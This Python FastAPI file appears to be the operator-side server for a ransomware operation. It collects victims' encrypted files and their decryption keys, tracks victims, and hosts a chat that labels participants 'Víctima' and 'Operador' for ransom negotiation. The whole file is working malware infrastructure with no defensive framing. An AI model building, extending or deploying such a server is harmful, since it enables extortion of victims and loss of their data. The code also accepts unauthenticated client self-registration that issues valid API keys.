import json
import secrets
from datetime import datetime

from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect, Header
from pydantic import BaseModel

from database import collection, decrypted_collection, key_collection, db, messages_collection

app = FastAPI()


# Modelos existentes
class FileData(BaseModel):
    file_name: str
    data: str


class KeyData(BaseModel):
    username: str
    key: str


# Modelo para registro de clientes
class ClientRegistrationResponse(BaseModel):
    api_key: str


# WebSocket (sin cambios)
class ConnectionManager:
    def __init__(self):
        self.active_connections = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            await connection.send_text(message)


manager = ConnectionManager()


@app.websocket("/chat")
async def websocket_endpoint(websocket: WebSocket, api_key: str = Header(None)):
    try:
        validate_api_key(api_key)
        await manager.connect(websocket)

        while True:
            data = await websocket.receive_text()
            try:
                message_data = json.loads(data)

                # Guardar mensaje en la base de datos
                if message_data.get("type") == "message":
                    messages_collection.insert_one({
                        "sender_id": message_data.get("sender", "unknown"),
                        "recipient_id": message_data.get("recipient", "all"),
                        "content": message_data.get("content", ""),
                        "timestamp": datetime.now().isoformat(),
                        "read": False
                    })

                # Formatear mensaje para broadcast
                if message_data.get("type") == "message":
                    sender_type = message_data.get("sender_type", "unknown")
                    sender = message_data.get("sender", "unknown")
                    content = message_data.get("content", "")

                    if sender_type == "victim":
                        formatted_message = f"Víctima ({sender}): {content}"
                    elif sender_type == "operator":
                        formatted_message = f"Operador: {content}"
                    else:
                        formatted_message = f"{sender}: {content}"

                    await manager.broadcast(formatted_message)

            except json.JSONDecodeError:
                # Si no es JSON, enviar como texto plano
                await manager.broadcast(f"Mensaje: {data}")

    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        print(f"Error en WebSocket: {e}")
        if websocket in manager.active_connections:
            manager.disconnect(websocket)


# Endpoint para registrar clientes y generar API Key
@app.post("/register/", response_model=ClientRegistrationResponse)
async def register_client():
    api_key = secrets.token_hex(16)
    db["api_keys"].insert_one({"api_key": api_key, "active": True})
    return {"api_key": api_key}


# Función auxiliar para validar API Keys
def validate_api_key(api_key: str):
    key_data = db["api_keys"].find_one({"api_key": api_key, "active": True})
    if not key_data:
        raise HTTPException(status_code=403, detail="Unauthorized")


# Endpoints existentes protegidos con API Key
@app.post("/save_file/")
async def save_file(file_data: FileData, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        collection.insert_one(file_data.dict())
        return {"message": "File saved successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/save_key/")
async def save_key(key_data: KeyData, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        key_collection.update_one(
            {"username": key_data.username},
            {"$set": {"key": key_data.key}},
            upsert=True
        )
        return {"message": "Key saved successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/get_key/{username}")
async def get_key(username: str, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        key_data = key_collection.find_one({"username": username})
        if key_data:
            return {"key": key_data["key"]}
        else:
            raise HTTPException(status_code=404, detail="Key not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/move_decrypted_file/")
async def move_decrypted_file(file_data: FileData, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        collection.delete_one({"file_name": file_data.file_name})
        decrypted_collection.insert_one(file_data.dict())
        return {"message": "File moved to decrypted collection successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/save_message/")
async def save_message(message_data: dict, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        # Guardar mensaje con timestamp
        message_data["timestamp"] = datetime.now().isoformat()
        messages_collection.insert_one(message_data)
        return {"message": "Message saved successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/get_messages/{client_id}")
async def get_messages(client_id: str, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        # Recuperar mensajes para un cliente específico
        messages = list(messages_collection.find(
            {"recipient_id": client_id},
            {"_id": 0}
        ).sort("timestamp", 1))
        return messages
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/mark_messages_read/{client_id}")
async def mark_messages_read(client_id: str, api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        result = messages_collection.update_many(
            {"recipient_id": client_id, "read": False},
            {"$set": {"read": True}}
        )
        return {"message": f"{result.modified_count} messages marked as read"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/get_clients/")
async def get_clients(api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        # Obtener clientes únicos de la colección de mensajes
        clients = list(messages_collection.aggregate([
            {"$group": {"_id": "$recipient_id", "last_activity": {"$max": "$timestamp"}}},
            {"$match": {"_id": {"$regex": "^(?!operator)"}}},  # Excluir al operador
            {"$project": {"client_id": "$_id", "last_activity": 1, "_id": 0}},
            {"$sort": {"last_activity": -1}}
        ]))
        return clients
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/get_encrypted_files/")
async def get_encrypted_files(api_key: str = Header(None)):
    validate_api_key(api_key)
    try:
        files = list(collection.find({}, {"_id": 0}))
        # Añadir fecha actual a cada archivo para mostrar en la interfaz
        for file in files:
            if "date" not in file:
                file["date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if "status" not in file:
                file["status"] = "Cifrado"
        return files
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# Configuración HTTPS con certificados SSL
if __name__ == "__main__":
    import uvicorn

    # Ruta a los certificados SSL generados con OpenSSL
    ssl_certfile = "cert.pem"
    ssl_keyfile = "key.pem"

    uvicorn.run(app, host="0.0.0.0", port=443, ssl_certfile=ssl_certfile, ssl_keyfile=ssl_keyfile)
